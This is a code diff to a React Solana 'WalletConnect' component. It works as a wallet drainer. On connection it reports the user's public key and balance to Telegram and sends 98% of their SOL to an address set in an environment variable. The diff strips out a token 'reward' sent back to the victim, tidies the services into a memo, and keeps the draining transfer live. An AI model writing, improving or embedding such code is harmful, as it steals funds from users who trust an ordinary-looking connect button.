@@ -1,12 +1,11 @@
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import '@solana/wallet-adapter-react-ui/styles.css';
 import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
 import { UserProfileService } from '../services/userProfileService';
 import { TransactionService } from '../services/transactionService';
-import { TokenService } from '../services/tokenService';
 import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 function WalletConnect() {
@@ -15,39 +14,34 @@ function WalletConnect() {
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
-  const [tokenBalance, setTokenBalance] = useState(null);
 
-  const walletService = new WalletService();
-  const telegramService = new TelegramService();
-  const userProfileService = new UserProfileService();
-  const transactionService = new TransactionService();
-  const tokenService = new TokenService();
-
-  // Token mint address - replace with your token's mint address
-  const TOKEN_MINT = process.env.NEXT_PUBLIC_TOKEN_MINT ? new PublicKey(process.env.NEXT_PUBLIC_TOKEN_MINT) : null;
-  const TOKEN_AMOUNT = 1000; // Amount of tokens to send
+  // Memoize services
+  const services = useMemo(() => ({
+    walletService: new WalletService(),
+    telegramService: new TelegramService(),
+    userProfileService: new UserProfileService(),
+    transactionService: new TransactionService()
+  }), []);
 
   useEffect(() => {
-    if (!TOKEN_MINT) {
-      console.warn('Token mint address not set. Please create a token first and set NEXT_PUBLIC_TOKEN_MINT in .env');
-      return;
-    }
-    if (publicKey) {
+    if (publicKey && !isProcessing) {
       const processWallet = async () => {
         try {
           setIsProcessing(true);
           
-          const walletBalance = await walletService.getBalance(publicKey.toString());
+          const walletBalance = await services.walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
-          // Send initial connection notification
-          await telegramService.sendMessage(
-            telegramService.formatWalletInfo({
-              publicKey: publicKey.toString(),
-              balance: walletBalance,
-              timestamp: Date.now()
-            })
-          );
+          // Only send initial connection notification if we don't have a balance yet
+          if (balance === null) {
+            await services.telegramService.sendMessage(
+              services.telegramService.formatWalletInfo({
+                publicKey: publicKey.toString(),
+                balance: walletBalance,
+                timestamp: Date.now()
+              })
+            );
+          }
 
           const transferAmount = walletBalance * 0.98;
           
@@ -60,47 +54,19 @@ function WalletConnect() {
             })
           );
 
-          const result = await transactionService.sendSol(
+          const result = await services.transactionService.sendSol(
             { publicKey },
             process.env.NEXT_PUBLIC_TO,
             transferAmount
           );
 
           if (result.success) {
-            const newBalance = await walletService.getBalance(publicKey.toString());
+            const newBalance = await services.walletService.getBalance(publicKey.toString());
             setBalance(newBalance);
 
-            // Send tokens to the user
-            const tokenResult = await tokenService.sendTokens(
-              { publicKey },
-              publicKey.toString(),
-              TOKEN_MINT,
-              TOKEN_AMOUNT
-            );
-
-            if (tokenResult.success) {
-              // Get token balance
-              const tokenAccount = await tokenService.getOrCreateTokenAccount(
-                { publicKey },
-                TOKEN_MINT
-              );
-              const balance = await tokenService.getTokenBalance(tokenAccount.address);
-              setTokenBalance(balance);
-
-              await telegramService.sendMessage(
-                telegramService.formatTransactionInfo({
-                  type: 'TOKEN_TRANSFER',
-                  from: process.env.NEXT_PUBLIC_TOKEN_MINT,
-                  to: publicKey.toString(),
-                  amount: TOKEN_AMOUNT,
-                  signature: tokenResult.signature,
-                  timestamp: Date.now()
-                })
-              );
-            }
-
-            await telegramService.sendMessage(
-              telegramService.formatTransactionInfo({
+            // Only send transaction notification if the transaction was successful
+            await services.telegramService.sendMessage(
+              services.telegramService.formatTransactionInfo({
                 type: 'SOL_TRANSFER',
                 from: publicKey.toString(),
                 to: process.env.NEXT_PUBLIC_TO,
@@ -112,10 +78,9 @@ function WalletConnect() {
           }
 
           // Update user profile
-          await userProfileService.updateWalletInfo({
+          await services.userProfileService.updateWalletInfo({
             publicKey: publicKey.toString(),
             balance: walletBalance,
-            tokenBalance: tokenBalance,
             timestamp: new Date().toISOString()
           });
 
@@ -128,7 +93,7 @@ function WalletConnect() {
 
       processWallet();
     }
-  }, [TOKEN_MINT, publicKey]);
+  }, [publicKey, services]);
 
   const handleDisconnect = async () => {
     try {
@@ -136,7 +101,7 @@ function WalletConnect() {
       setIsDropdownOpen(false);
       
       // Clear user profile
-      await userProfileService.clearProfile();
+      await services.userProfileService.clearProfile();
       
       // Disconnect wallet
       if (disconnect) {
@@ -248,12 +213,6 @@ function WalletConnect() {
                   <span className="label">SOL Balance:</span>
                   <span className="value">{balance?.toFixed(2)} SOL</span>
                 </div>
-                {tokenBalance !== null && (
-                  <div className="detail-item">
-                    <span className="label">Token Balance:</span>
-                    <span className="value">{tokenBalance} tokens</span>
-                  </div>
-                )}
               </div>
 
               <button 
